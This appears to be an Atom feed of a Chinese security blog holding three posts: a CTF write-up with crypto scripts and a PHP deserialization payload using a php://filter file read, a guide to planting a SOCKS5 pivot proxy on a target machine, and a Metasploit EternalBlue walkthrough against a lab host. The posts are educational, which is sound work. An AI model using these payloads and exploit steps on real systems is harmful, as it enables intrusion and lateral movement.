<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robot&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-04-22T14:55:28.484Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Robot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛writerup</title>
    <link href="http://yoursite.com/2019/04/22/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/04/22/第十二届全国大学生信息安全竞赛/</id>
    <published>2019-04-21T17:59:24.000Z</published>
    <updated>2019-04-22T14:55:28.484Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件，用笔记本打开，然后摆几个post就出flag了。</p><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;87e37d95-6a48-4463-aff8-b0dbd27d3b7d&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-saleae"><a href="#0x02-saleae" class="headerlink" title="0x02 saleae"></a>0x02 saleae</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开文件，打开后发现4个channel是spi的，没用过这个软件，对着手册一顿下操作，然后根据channel改了一下参数，发现flag在解码协议里：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/1.jpg" alt="image"></p><h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03 24c"></a>0x03 24c</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开，本以为是I2C协议，其实不然，解码协议中有flag信息，后来发现发现ac有重写，穷举了一下：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/2.jpg" alt="image"></p><p>将第一段flag和第二段拼接得到flag。</p><h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-part-des"><a href="#0x04-part-des" class="headerlink" title="0x04 part_des"></a>0x04 part_des</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>google了一下，找到大佬实现的DES，与本题主体类似，套用改了一下，由于脚本过长，贴出主要代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">def run(self, key, text, action=ENCRYPT, padding=False):</span><br><span class="line">        if len(key) &lt; 8:</span><br><span class="line">            raise &quot;Key Should be 8 bytes long&quot;</span><br><span class="line">        elif len(key) &gt; 8:</span><br><span class="line">            key = key[:8] #If key size is above 8bytes, cut to be 8bytes long</span><br><span class="line"></span><br><span class="line">        self.password = key</span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line">        if padding and action==ENCRYPT:</span><br><span class="line">            self.addPadding()</span><br><span class="line">        elif len(self.text) % 8 != 0:#If not padding specified data size must be multiple of 8 bytes</span><br><span class="line">            raise &quot;Data size should be multiple of 8&quot;</span><br><span class="line"></span><br><span class="line">        self.generatekeys() #Generate all the keys</span><br><span class="line">        text_blocks = nsplit(self.text, 8) #Split the text in blocks of 8 bytes so 64 bits</span><br><span class="line">        result = list()</span><br><span class="line">        for block in text_blocks:#Loop over all the blocks of data</span><br><span class="line">            print block</span><br><span class="line">            block = string_to_bit_array(block)#Convert the block in bit array</span><br><span class="line">            block = self.permut(block,PI)#Apply the initial permutation</span><br><span class="line">            g, d = nsplit(block, 32) #g(LEFT), d(RIGHT)</span><br><span class="line">            tmp = None</span><br><span class="line">            for i in range(16): #Do the 16 rounds</span><br><span class="line">                d_e = self.expand(d, E)</span><br><span class="line">                if action == ENCRYPT:</span><br><span class="line">                    tmp = self.xor(self.keys[i], d_e)#If encrypt use Ki</span><br><span class="line">                else:</span><br><span class="line">                    tmp = self.xor(self.keys[15-i], d_e)#If decrypt start by the last key</span><br><span class="line">                tmp = self.substitute(tmp)</span><br><span class="line">                tmp = self.permut(tmp, P)</span><br><span class="line">                tmp = self.xor(g, tmp)</span><br><span class="line">                g = d</span><br><span class="line">                d = tmp</span><br><span class="line">            result += self.permut(d+g, PI_1) #Do the last permut and append the result to result</span><br><span class="line">        final_res = bit_array_to_string(result)</span><br><span class="line">        if padding and action==DECRYPT:</span><br><span class="line">            return self.removePadding(final_res) #Remove the padding if decrypt and padding is true</span><br><span class="line">        else:</span><br><span class="line">            return final_res #Return the final string of data ciphered/deciphered</span><br></pre></td></tr></table></figure><p>根据上面的思路，改成我们要的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def run(self, aRound):</span><br><span class="line">       part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       keymap = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       tkey = []</span><br><span class="line">       for i in range(16):</span><br><span class="line">           tmp = keymap[6*i: 6+6*i]</span><br><span class="line">           tkey.append(string_to_bit_array(tmp))</span><br><span class="line">       self.keys = tkey</span><br><span class="line">       result = list()</span><br><span class="line"></span><br><span class="line">       block = string_to_bit_array(part_encode)</span><br><span class="line">       </span><br><span class="line">       d, g = nsplit(block, 32) </span><br><span class="line">       tmp = None</span><br><span class="line">       for i in range(16): </span><br><span class="line">           if i &lt; aRound:</span><br><span class="line">               continue</span><br><span class="line">           d_e = self.expand(d, E)</span><br><span class="line">           tmp = self.xor(self.keys[15-i], d_e)</span><br><span class="line">           tmp = self.substitute(tmp)</span><br><span class="line">           tmp = self.permut(tmp, P)</span><br><span class="line">           tmp = self.xor(g, tmp)</span><br><span class="line">           g = d</span><br><span class="line">           d = tmp</span><br><span class="line">       result += self.permut(d+g, PI_1)</span><br><span class="line">       final_res = bit_array_to_string(result)</span><br><span class="line">       return final_res</span><br></pre></td></tr></table></figure><p>本题其实的考点就是把没解密完的 DES 继续解密。</p><h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0ur9Ood&#125;</span><br></pre></td></tr></table></figure><h3 id="0x05-Asymmetric"><a href="#0x05-Asymmetric" class="headerlink" title="0x05 Asymmetric"></a>0x05 Asymmetric</h3><h3 id="操作过程："><a href="#操作过程：" class="headerlink" title="操作过程："></a>操作过程：</h3><p>加密的n的公匙是pr,直接贴出脚本吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2,codecs,base64</span><br><span class="line"></span><br><span class="line">e=long(58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979)</span><br><span class="line">n=long(754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721)</span><br><span class="line">t=long(165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867)</span><br><span class="line">p=long(t**2)</span><br><span class="line">q=long(t**2)</span><br><span class="line"></span><br><span class="line">d=long(gmpy2.invert(e,p**2*(p-1)))#;print d</span><br><span class="line">c=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&quot;</span><br><span class="line">c=base64.b64decode(c)</span><br><span class="line">c=c.encode(&apos;hex&apos;)#;print c</span><br><span class="line">c=int(c,16)</span><br><span class="line">m=hex(pow(c,d,n))[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">if(len(m)%2==1):</span><br><span class="line">    m=&apos;0&apos;+m</span><br><span class="line">print m.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><p>解这题用到了欧拉定理，得到m的值之后解码就得到了flag。</p><h3 id="flag的值："><a href="#flag的值：" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ec33f669d2d659e2bc27dbffdfeb0f38&#125;</span><br></pre></td></tr></table></figure><h3 id="0x06-JustSoso"><a href="#0x06-JustSoso" class="headerlink" title="0x06 JustSoso"></a>0x06 JustSoso</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源代码，发现index.php?file=xxx.php及hint，用伪协议读?file=php://filter/convert.base64-encode/resource=hint.php和index.php，解码后得到源码。<br>hint.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/3.png" alt="image"></p><p>index.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/4.png" alt="image"></p><p>从源码可以看出反序列化漏洞，解析漏洞过parse_url；链条用Handle和Flag；将__wake_up的数目改大，即可绕过二次赋值；unserilize是私有函数，用%00代替<0x00>，最终payload为：</0x00></p><p>///index.php?file=hint.php&amp;payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;N;s:10:”token_flag”;R:4;}}</p><h3 id="flag的值：-1"><a href="#flag的值：-1" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa9b19d3-d437-4668-99c3-d0a8c888633f&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0x01-签到题&quot;&gt;&lt;a href=&quot;#0x01-签到题&quot; class=&quot;headerlink&quot; title=&quot;0x01 签到题&quot;&gt;&lt;/a&gt;0x01 签到题&lt;/h3&gt;&lt;h3 id=&quot;操作内容：&quot;&gt;&lt;a href=&quot;#操作内容：&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>公网服务器搭建socks5代理</title>
    <link href="http://yoursite.com/2018/05/01/%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/01/公网服务器搭建socks5代理/</id>
    <published>2018-05-01T05:52:25.000Z</published>
    <updated>2018-05-01T07:27:53.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理。<a id="more"></a>文章中所用到的工具和脚本打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h2 id="windows环境下搭建socks5代理"><a href="#windows环境下搭建socks5代理" class="headerlink" title="windows环境下搭建socks5代理"></a>windows环境下搭建socks5代理</h2><h3 id="1、ew的使用"><a href="#1、ew的使用" class="headerlink" title="1、ew的使用"></a>1、ew的使用</h3><p>我这里是用ew和proxifier配合使用的，只需要把ew放到目标机上，然后执行一条命令就得了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s ssocksd -l 8006</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/1.png" alt="image"></p><p>8006是要使用的端口，如果被占用了可以改用别的端口</p><h3 id="2、proxifier的配置"><a href="#2、proxifier的配置" class="headerlink" title="2、proxifier的配置"></a>2、proxifier的配置</h3><p>在目标机执行完那条命令之后就回到自己的机子，打开proxifier-&gt;配置文件-&gt;代理服务器-&gt;添加一个服务器，地址填刚才那台机子的ip地址，端口就是执行那条命令输入的端口，协议选socks版本5，确定。</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/2.png" alt="image"></p><p>这样就已经配置完成了，百度一下我们的ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/6.png" alt="image"></p><h2 id="linux环境搭建socks5代理"><a href="#linux环境搭建socks5代理" class="headerlink" title="linux环境搭建socks5代理"></a>linux环境搭建socks5代理</h2><p>linux搭建的话就要用到一个py脚本了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># Filename s5.py</span><br><span class="line"># Python Dynamic Socks5 Proxy</span><br><span class="line"># Usage: python s5.py 1080</span><br><span class="line"># Background Run: nohup python s5.py 1080 &amp;</span><br><span class="line"> </span><br><span class="line">import socket, sys, select, SocketServer, struct, time</span><br><span class="line"> </span><br><span class="line">class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass</span><br><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                if remote.send(sock.recv(4096)) &lt;= 0: break</span><br><span class="line">            if remote in r:</span><br><span class="line">                if sock.send(remote.recv(4096)) &lt;= 0: break</span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            pass # print &apos;from &apos;, self.client_address nothing to do.</span><br><span class="line">            sock = self.connection</span><br><span class="line">            # 1. Version</span><br><span class="line">            sock.recv(262)</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;);</span><br><span class="line">            # 2. Request</span><br><span class="line">            data = self.rfile.read(4)</span><br><span class="line">            mode = ord(data[1])</span><br><span class="line">            addrtype = ord(data[3])</span><br><span class="line">            if addrtype == 1:       # IPv4</span><br><span class="line">                addr = socket.inet_ntoa(self.rfile.read(4))</span><br><span class="line">            elif addrtype == 3:     # Domain name</span><br><span class="line">                addr = self.rfile.read(ord(sock.recv(1)[0]))</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.rfile.read(2))</span><br><span class="line">            reply = &quot;\x05\x00\x00\x01&quot;</span><br><span class="line">            try:</span><br><span class="line">                if mode == 1:  # 1. Tcp connect</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    remote.connect((addr, port[0]))</span><br><span class="line">                    pass # print &apos;To&apos;, addr, port[0]  nothing do to.</span><br><span class="line">                else:</span><br><span class="line">                    reply = &quot;\x05\x07\x00\x01&quot; # Command not supported</span><br><span class="line">                local = remote.getsockname()</span><br><span class="line">                reply += socket.inet_aton(local[0]) + struct.pack(&quot;&gt;H&quot;, local[1])</span><br><span class="line">            except socket.error:</span><br><span class="line">                # Connection refused</span><br><span class="line">                reply = &apos;\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">            sock.send(reply)</span><br><span class="line">            # 3. Transfering</span><br><span class="line">            if reply[1] == &apos;\x00&apos;:  # Success</span><br><span class="line">                if mode == 1:    # 1. Tcp connect</span><br><span class="line">                    self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error:</span><br><span class="line">            pass #print &apos;error&apos; nothing to do .</span><br><span class="line">        except IndexError:</span><br><span class="line">            pass</span><br><span class="line">def main():</span><br><span class="line">    filename = sys.argv[0];</span><br><span class="line">    if len(sys.argv)&lt;2:</span><br><span class="line">        print &apos;usage: &apos; + filename + &apos; port&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    socks_port = int(sys.argv[1]);    </span><br><span class="line">    server = ThreadingTCPServer((&apos;&apos;, socks_port), Socks5Server)</span><br><span class="line">    print &apos;bind port: %d&apos; % socks_port + &apos; ok!&apos;</span><br><span class="line">    server.serve_forever()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本在打包链接里面都有，这个也是一条命令就搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python s5.py 8088</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/3.png" alt="image"></p><p>同样的后面8088是端口，可以修改的，执行完了之后再回到我们的proxifier里面添加服务器，配置跟前面的一样</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/4.png" alt="image"></p><p>因为我这里的windows和linux是不同的机子，所以ip设置的跟前面的不一样</p><p>再来百度看一下ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/5.png" alt="image"></p><p>OK，已经成功了！</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>emm，这篇文章主要是外网搭建socks5代理的，下一篇会讲到如果对方是内网的如何搭建socks5代理。</p><p>所有工具打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h5 id="—-未完待续—–"><a href="#—-未完待续—–" class="headerlink" title="—-未完待续—–"></a>—-未完待续—–</h5><h6 id="（注：本教程仅供学习，切勿用于非法用途！）"><a href="#（注：本教程仅供学习，切勿用于非法用途！）" class="headerlink" title="（注：本教程仅供学习，切勿用于非法用途！）"></a>（注：本教程仅供学习，切勿用于非法用途！）</h6>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理。&lt;/p&gt;
    
    </summary>
    
      <category term="外网代理" scheme="http://yoursite.com/categories/%E5%A4%96%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    
    
      <category term="代理" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Ms17_010漏洞的利用</title>
    <link href="http://yoursite.com/2018/04/09/Ms17-010%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2018/04/09/Ms17-010漏洞的利用/</id>
    <published>2018-04-09T11:39:36.000Z</published>
    <updated>2018-05-03T12:08:44.786Z</updated>
    
    <content type="html"><![CDATA[<p>ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。</p><p> 攻击机：<br> kali<br> ip:192.168.245.132</p><p> 受害机：<br> win7<br> ip:192.168.61.160<br> <a id="more"></a><br>这里我是用我内网的两台机子测试的，如果是外网的那就要设置路由器的端口转发之类的。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：</p><p>1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小</p><p>2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大</p><p>3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>博主这里是直接用kali的msf里面自带的ms17_010模块<br>启动msf控制台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p><p>然后使用ms17_010_eternalblue这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/1.jpg" alt="image"></p><p>用show options 命令查看设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/2.jpg" alt="image"></p><p>Exploit target表示可以攻击的目标，这个模块只能攻击win7和win server2008的，yes是表示需要设置的，由图可以看出其他都已经设置好了，我们只需要设置RHOST，也就是ip地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.61.160</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p>开始监听会话</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/3.jpg" alt="image"></p><p>看到这样子那就表示已经成功getshell了</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/4.jpg" alt="image"></p><p>尝试这输入一些命令</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/5.jpg" alt="image"></p><p>好的已经成功入侵了这台电脑，现在他的电脑就是你的电脑，你的电脑还是你的电脑，接下来干嘛自己发挥想象力了！炒鸡简单的一个漏洞利用。</p><h2 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h2><p>电脑管家或者360之类的都已经有了对应的补丁，下载补丁就行了。</p><h6 id="注：本教程仅供学习，切勿用于非法用途！"><a href="#注：本教程仅供学习，切勿用于非法用途！" class="headerlink" title="(注：本教程仅供学习，切勿用于非法用途！)"></a>(注：本教程仅供学习，切勿用于非法用途！)</h6>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。&lt;/p&gt;
&lt;p&gt; 攻击机：&lt;br&gt; kali&lt;br&gt; ip:192.168.245.132&lt;/p&gt;
